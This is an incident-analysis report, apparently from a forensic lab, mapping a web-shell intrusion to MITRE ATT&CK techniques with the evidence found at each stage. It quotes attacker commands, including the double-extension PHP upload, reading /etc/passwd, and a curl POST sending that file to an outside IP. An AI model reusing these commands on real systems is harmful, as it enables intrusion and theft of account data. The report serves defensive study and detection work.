# MITRE ATT\&CK Mapping

### Overview

The attack observed during the investigation was mapped to the **MITRE ATT\&CK® Enterprise Framework** to classify the adversary's tactics and techniques. Mapping attacker behavior to MITRE ATT\&CK provides a standardized understanding of the intrusion, making it easier to compare with known threat actor behaviors and improve defensive strategies.

Analysis of the packet capture, HTTP requests, reverse shell session, and recovered command execution identified techniques spanning multiple phases of the ATT\&CK lifecycle.

***

## MITRE ATT\&CK Matrix

| Tactic              | Technique ID | Technique                                 | Evidence                                                          |
| ------------------- | ------------ | ----------------------------------------- | ----------------------------------------------------------------- |
| Reconnaissance      | T1595        | Active Scanning                           | Enumeration of web directories (`/admin`, `/uploads`, `/reviews`) |
| Initial Access      | T1190        | Exploit Public-Facing Application         | Exploitation of vulnerable web application upload functionality   |
| Execution           | T1505.003    | Web Shell                                 | Execution of `image.jpg.php` from the upload directory            |
| Command and Control | T1071.001    | Application Layer Protocol: Web Protocols | Reverse shell communication over TCP port 8080                    |
| Discovery           | T1082        | System Information Discovery              | `uname -a`                                                        |
| Discovery           | T1033        | System Owner/User Discovery               | `whoami`                                                          |
| Discovery           | T1083        | File and Directory Discovery              | `pwd`, `ls /home`                                                 |
| Discovery           | T1005        | Data from Local System                    | Reading `/etc/passwd`                                             |
| Collection          | T1005        | Data from Local System                    | Collection of Linux account information                           |
| Exfiltration        | T1041        | Exfiltration Over C2 Channel              | Attempted HTTP POST using `curl`                                  |

***

## Technique Analysis

### 1. Active Scanning (T1595)

#### Tactic

Reconnaissance

#### Description

The attacker performed reconnaissance against the public web application to identify accessible resources and potential attack vectors.

#### Evidence

Observed requests included:

```
GET /admin/GET /uploads/GET /reviews/GET /admin/uploadsGET /reviews/uploads
```

These requests demonstrate systematic enumeration of the application's structure before exploitation.

***

### 2. Exploit Public-Facing Application (T1190)

#### Tactic

Initial Access

#### Description

After identifying an exposed upload directory, the attacker exploited the web application to upload and execute a malicious PHP script.

#### Evidence

```
GET /reviews/uploads/image.jpg.php
```

The double-extension filename strongly suggests an attempt to bypass upload validation while retaining server-side execution capability.

***

### 3. Web Shell (T1505.003)

#### Tactic

Execution

#### Description

The uploaded PHP file functioned as a web shell, allowing the attacker to execute commands remotely.

#### Evidence

Execution of:

```
image.jpg.php
```

followed immediately by establishment of a reverse shell.

***

### 4. Application Layer Protocol (T1071.001)

#### Tactic

Command and Control

#### Description

Following successful exploitation, the attacker established a persistent reverse shell over TCP port **8080**, enabling interactive command execution.

#### Evidence

* TCP three-way handshake
* Persistent PSH/ACK traffic
* Continuous bidirectional communication
* Interactive shell session

***

### 5. System Information Discovery (T1082)

#### Tactic

Discovery

#### Description

The attacker collected operating system information to understand the compromised environment.

#### Evidence

```
uname -a
```

Result:

```
Linux ubuntu-virtual-machine
```

***

### 6. System Owner/User Discovery (T1033)

#### Tactic

Discovery

#### Description

The attacker determined the privileges of the compromised process.

#### Evidence

```
whoami
```

Output:

```
www-data
```

This confirmed that the web server process was executing under the **www-data** account.

***

### 7. File and Directory Discovery (T1083)

#### Tactic

Discovery

#### Description

The attacker enumerated directories to better understand the file system.

#### Evidence

```
pwdls /home
```

Output included:

```
/var/www/html/reviews/uploadsubuntu
```

***

### 8. Data from Local System (T1005)

#### Tactic

Discovery / Collection

#### Description

The attacker collected sensitive local system information by reading the Linux password file.

#### Evidence

```
cat /etc/passwd
```

The command returned the complete list of local user accounts.

***

### 9. Exfiltration Over C2 Channel (T1041)

#### Tactic

Exfiltration

#### Description

After collecting system information, the attacker attempted to transmit the contents of `/etc/passwd` using an HTTP POST request.

#### Evidence

```
curl -X POST -d /etc/passwd http://117.11.88.124:443/
```

Although portions of the packet capture were missing, the recovered command provides strong evidence of an attempted exfiltration through the existing communication channel.

***

## ATT\&CK Coverage Summary

<table data-search="false"><thead><tr><th>ATT&#x26;CK Tactic</th><th>Observed</th></tr></thead><tbody><tr><td>Reconnaissance</td><td>✅</td></tr><tr><td>Initial Access</td><td>✅</td></tr><tr><td>Execution</td><td>✅</td></tr><tr><td>Command and Control</td><td>✅</td></tr><tr><td>Discovery</td><td>✅</td></tr><tr><td>Collection</td><td>✅</td></tr><tr><td>Exfiltration</td><td>✅</td></tr></tbody></table>

***

## Conclusion

Mapping the observed activities to the MITRE ATT\&CK Enterprise Framework shows that the attacker progressed through multiple stages of the attack lifecycle. Beginning with reconnaissance of the public-facing web application, the adversary exploited an upload vulnerability to deploy a PHP web shell, established a reverse shell for command-and-control, performed host discovery and account enumeration, collected sensitive system information, and attempted to exfiltrate that data over the existing communication channel. This mapping provides a standardized view of the attack and supports future threat hunting, detection engineering, and defensive improvements.
